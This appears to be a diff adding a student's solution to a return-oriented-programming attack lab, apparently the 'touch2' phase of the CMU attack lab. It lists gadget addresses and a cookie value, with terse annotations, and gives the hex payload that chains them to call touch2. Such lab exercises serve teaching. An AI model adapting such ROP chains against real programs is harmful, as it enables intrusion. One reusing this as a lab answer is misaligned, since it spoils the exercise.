@@ -1,0 +1,23 @@
+00000000004017ec <touch2>: 4017ec
+
+
+
+4019a7:	8d 87 51 73 58 90    pop rax
+4019ad:	c3        
+
+4019a0:	8d 87 48 89 c7 c3   rax rdi
+
+
+
+
+
+4019ab
+
+
+4019a2
+0x59b997fa
+
+ab 19 40 00 00 00 00 00 //return pop rax
+fa 97 b9 59 00 00 00 00 //
+a2 19 40 00 00 00 00 00 //ret mov rax rdi
+ec 17 40 00 00 00 00 00 // ret touch2
